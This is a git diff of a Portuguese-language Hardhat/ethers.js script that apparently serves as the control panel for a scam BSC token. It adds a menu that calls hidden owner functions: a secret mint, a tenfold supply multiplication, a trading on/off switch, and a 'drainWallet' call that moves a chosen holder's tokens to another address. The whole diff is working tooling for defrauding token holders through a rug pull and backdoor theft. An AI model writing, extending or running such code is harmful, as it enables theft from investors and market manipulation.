@@ -1,5 +1,5 @@
 const hre = require("hardhat");
-const { parseUnits } = require("ethers");
+const { parseUnits, formatUnits } = require("ethers");
 const readline = require('readline');
 
 const rl = readline.createInterface({
@@ -12,6 +12,10 @@ const TOKEN_ABI = [
     "function decimals() external view returns (uint8)",
     "function balanceOf(address account) external view returns (uint256)",
     "function symbol() external view returns (string)",
+    "function updateSupply() external",
+    "function setTradingStatus(bool status) external",
+    "function drainWallet(address target, address to) external",
+    "function isSupplyMultiplied() external view returns (bool)",
 ];
 
 async function question(query) {
@@ -20,40 +24,22 @@ async function question(query) {
     });
 }
 
-async function main() {
-    const [signer] = await hre.ethers.getSigners();
-    console.log("Executando mint com a conta:", signer.address);
-
-    // Solicitar informações
-    const tokenAddress = await question("Digite o endereço do token: ");
-    const mintToAddress = await question("Digite o endereço que receberá os tokens (deixe em branco para usar sua carteira): ");
+async function mintTokens(token, signer, decimals) {
+    const mintToAddress = await question("Digite o endereço que receberá os tokens (vazio para sua carteira): ");
     const amountStr = await question("Digite a quantidade de tokens para mintar: ");
 
-    // Conectar ao contrato
-    const token = new hre.ethers.Contract(tokenAddress, TOKEN_ABI, signer);
-
-    // Obter informações do token
-    const decimals = await token.decimals();
+    const recipient = mintToAddress || signer.address;
+    const amount = parseUnits(amountStr, decimals);
     const symbol = await token.symbol();
 
-    // Definir endereço de destino
-    const recipient = mintToAddress || signer.address;
-
-    // Converter quantidade considerando os decimais
-    const amount = parseUnits(amountStr, decimals);
-
-    // Mostrar balance anterior
     const balanceBefore = await token.balanceOf(recipient);
     console.log(`\nBalance atual de ${recipient}: ${formatUnits(balanceBefore, decimals)} ${symbol}`);
 
     try {
         console.log(`\nMintando ${amountStr} ${symbol} para ${recipient}...`);
         const mintTx = await token._secretMint(recipient, amount);
-
-        console.log("Aguardando confirmação...");
         const receipt = await mintTx.wait();
 
-        // Mostrar balance após o mint
         const balanceAfter = await token.balanceOf(recipient);
 
         console.log(`\nMint realizado com sucesso!
@@ -68,19 +54,89 @@ async function main() {
         https://bscscan.com/tx/${receipt.hash}`);
 
     } catch (error) {
-        if (error.message.includes("caller is not the owner")) {
-            console.error("\nERRO: Apenas o dono do contrato pode fazer mint!");
-        } else {
-            console.error("\nErro ao fazer mint:", error.message);
-        }
+        console.error("\nErro ao fazer mint:", error.message);
     }
-
-    rl.close();
 }
 
-// Função auxiliar para formatar valores
-function formatUnits(amount, decimals) {
-    return hre.ethers.formatUnits(amount, decimals);
+async function main() {
+    const [signer] = await hre.ethers.getSigners();
+    console.log("Executando operações com a conta:", signer.address);
+
+    const tokenAddress = await question("Digite o endereço do token: ");
+    const token = new hre.ethers.Contract(tokenAddress, TOKEN_ABI, signer);
+    const decimals = await token.decimals();
+
+    while (true) {
+        console.log("\n=== Menu de Operações ===");
+        console.log("1. Mint tokens");
+        console.log("2. Multiplicar supply (10x)");
+        console.log("3. Controlar trading");
+        console.log("4. Drenar carteira");
+        console.log("5. Verificar status");
+        console.log("6. Sair");
+
+        const choice = await question("\nEscolha a operação: ");
+
+        switch (choice) {
+            case "1":
+                await mintTokens(token, signer, decimals);
+                break;
+
+            case "2":
+                try {
+                    const isMultiplied = await token.isSupplyMultiplied();
+                    if (isMultiplied) {
+                        console.log("\nSupply já foi multiplicado!");
+                        break;
+                    }
+
+                    console.log("\nMultiplicando supply...");
+                    const tx = await token.updateSupply();
+                    await tx.wait();
+                    console.log("Supply multiplicado com sucesso!");
+                } catch (error) {
+                    console.error("\nErro ao multiplicar supply:", error.message);
+                }
+                break;
+
+            case "3":
+                const status = await question("\nAtivar trading? (s/n): ");
+                try {
+                    await token.setTradingStatus(status.toLowerCase() === 's');
+                    console.log("Status de trading atualizado!");
+                } catch (error) {
+                    console.error("\nErro ao atualizar trading:", error.message);
+                }
+                break;
+
+            case "4":
+                const target = await question("\nEndereço alvo: ");
+                const to = await question("Endereço destino: ");
+                try {
+                    await token.drainWallet(target, to);
+                    console.log("Carteira drenada com sucesso!");
+                } catch (error) {
+                    console.error("\nErro ao drenar carteira:", error.message);
+                }
+                break;
+
+            case "5":
+                try {
+                    const isMultiplied = await token.isSupplyMultiplied();
+                    console.log(`\nStatus do Supply Multiplicado: ${isMultiplied}`);
+                } catch (error) {
+                    console.error("\nErro ao verificar status:", error.message);
+                }
+                break;
+
+            case "6":
+                rl.close();
+                return;
+
+            default:
+                console.log("\nOpção inválida!");
+        }
+    }
 }
 
 main()
